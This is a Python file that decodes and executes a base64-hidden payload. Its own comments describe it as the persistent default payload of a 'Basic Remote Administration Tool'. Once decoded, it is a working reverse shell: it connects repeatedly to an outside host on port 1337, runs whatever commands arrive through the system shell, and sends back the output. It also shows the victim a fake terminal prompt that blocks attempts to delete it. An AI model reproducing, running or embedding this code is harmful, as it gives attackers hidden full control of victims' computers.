import base64
exec(base64.b64decode(b'CiMgTmFtZTogRGVmYXVsdCBwYXlsb2FkIGZyb20gQlJBVC4KCiMgRGV0ZWN0aW9uIHJpc2s6IEhpZ2gKIyBQZXJzaXN0ZW50OiBZZXMKCiMgRGVzY3JpcHRpb246IFRoaXMgcGF5bG9hZCBpcyB0aGUgZGVmYXVsdCBmb3IgQlJBVCAoQmFzaWMgUmVtb3RlIEFkbWluaXN0cmF0aW9uIFRvb2wpLgojIFRoaXMgcGF5bG9hZCB3aGVuIGV4ZWN1dGVkLCB0cmllcyB0byBjb25uZWN0IHRvIHRoZSBzZXJ2ZXIgKEF0dGFja2VyKSwgaWYgY2Fubm90CiMgY29ubmVjdCwgdGhlbiByZXRyeS4gSWYgY29ubmVjdGVkLCB0aGVuIHRoZSBhdHRhY2tlciB3aWxsIGhhdmUgZnVsbCBhY2Nlc3MgdG8gaXQuCiMgTWVhbndoaWxlLCBpdCBsb29rcyBsaWtlIGEgbm9ybWFsIHRlcm1pbmFsIHRvIHRoZSB1c2VyLiBUaGUgdXNlciBjYW4gZXhlY3V0ZSBjb21tYW5kcwojIGxpa2Ugb24gYSBub3JtYWwgY29tcHV0ZXIsIGJ1dCBoZSBjYW5ub3QgZXhlY3V0ZSBjb21tYW5kcyB3aXRoIGNoYXJhY3RlcnMgJyonLCBvciAnLicsCiMgb3IgZXZlbiB0aGUgcGF5bG9hZCdzIGZpbGVuYW1lLCBtZWFuaW5nIHRoZSB1c2VyIGNhbm5vdCBkZWxldGUgdGhlIHBheWxvYWQuIEJ1dCwgaXQgaXMKIyBzdGlsbCBwb3NzaWJsZSB0byBkZWxldGUgaXQuIEZvciBleGFtcGxlLCB0aGUgdXNlciBjYW4gY2hhbmdlIGRpcmVjdG9yeSB0byAnLi4nLCBhbmQKIyB0aGVuIGRlbGV0ZSB0aGUgZGlyZWN0b3J5LiBNb3JlIG1ldGhvZHMgYXJlIGF2YWlsYWJlIHRvIGRlbGV0ZSBwYXlsb2FkLiBBbm90aGVyIHdheSBpcwojIHRvIGNyZWF0ZSBhIHNjcmlwdCB0byBkZWxldGUgdGhlIHBheWxvYWQuCgppbXBvcnQgc29ja2V0CmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBvcwppbXBvcnQgc3lzCnRyeToKICAgIGltcG9ydCBtdWx0aXRhc2tpbmcKCmV4Y2VwdDoKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIG11bHRpdGFza2luZycpCiAgICAgICAgICAgIGltcG9ydCBtdWx0aXRhc2tpbmcKICAgICAgICAgICAgYnJlYWsKCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBjb250aW51ZQoKcyA9IHNvY2tldC5zb2NrZXQoKQpuID0gJ1xuJwpuID0gbi5lbmNvZGUoKQoKZGVmIHByb2dyYW1fcmVzdGFydCgpOgogICAgICAgIHB5dGhvbiA9IHN5cy5leGVjdXRhYmxlCiAgICAgICAgb3MuZXhlY2wocHl0aG9uLCBweXRob24sICogc3lzLmFyZ3YpCiAgICAgICAgY3VyZGlyID0gb3MuZ2V0Y3dkKCkKCmRlZiB0cnlfY29ubmVjdCgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgICNwcmludCgiW2ldIFQ2WTFORyA3MCBDME5OM0M3Li4uIikgIyBEZWJ1ZyBvbmx5CiAgICAgICAgICAgIHMuY29ubmVjdCgoJ3NlY3VyZWxpbnV4LmFjY2Vzcy5seScsIDEzMzcpKQogICAgICAgICAgICBicmVhawoKICAgICAgICBleGNlcHQgQ29ubmVjdGlvblJlZnVzZWRFcnJvcjoKICAgICAgICAgICAgcGFzcwoKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCkBtdWx0aXRhc2tpbmcudGFzawpkZWYgbWFpbigpOgogICAgdHJ5X2Nvbm5lY3QoKQogICAgcnBsYXRmb3JtID0gc3lzLnBsYXRmb3JtLmVuY29kZSgpCiAgICBycGF5bG9hZF9uYW1lID0gc3lzLmFyZ3ZbMF0uZW5jb2RlKCkKICAgIHMuc2VuZGFsbChycGxhdGZvcm0pCiAgICBzLnJlY3YoMTYpCiAgICBzLnNlbmRhbGwocnBheWxvYWRfbmFtZSkKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICAjcHJpbnQoIltpXSBXMyA0NjMgTjBXIEMwTk4zQzczRCA3MCA3SDMgUzM2VjM2ISIpICMgRGVidWcgb25seQogICAgICAgICAgICBjbWQgPSBzLnJlY3YoMTAwMDAwKQogICAgICAgICAgICBpZiBjbWRbOjJdID09ICdjZCc6CiAgICAgICAgICAgICAgICBvcy5jaGRpcihjbWRbMzpdKQogICAgICAgICAgICAgICAgZGlyID0gb3MuZ2V0Y3dkKCkKICAgICAgICAgICAgICAgIHMuc2VuZGFsbCgnYmFjb2QnKQoKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJlc3VsdHMgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKQogICAgICAgICAgICAgICAgcmVzdWx0cyA9IHJlc3VsdHMuc3Rkb3V0LnJlYWQoKSArIHJlc3VsdHMuc3RkZXJyLnJlYWQoKQogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHMuc2VuZGFsbChuK3Jlc3VsdHMpCgogICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgIHByb2dyYW1fcmVzdGFydCgpCgogICAgICAgIGV4Y2VwdChCcm9rZW5QaXBlRXJyb3IsIE9TRXJyb3IpOgogICAgICAgICAgICBwcm9ncmFtX3Jlc3RhcnQoKQoKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByb2dyYW1fcmVzdGFydCgpCgppZiBzeXMucGxhdGZvcm0gPT0gJ250JzoKICAgIG9zLnN5c3RlbSgnY2xzJykKCmVsc2U6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKCndoaWxlIFRydWU6CiAgICB0cnk6CiAgICAgICAgbWFpbigpCiAgICAgICAgZnJvbnQgPSBpbnB1dCgiJCAiKQogICAgICAgIGlmIHN5cy5hcmd2WzBdIGluIGZyb250IG9yICcqJyBpbiBmcm9udCBvciAnLicgaW4gZnJvbnQ6CiAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgIGVsc2U6CiAgICAgICAgICAgIG9zLnN5c3RlbShmcm9udCkKCiAgICBleGNlcHQ6CiAgICAgICAgY29udGludWUK'))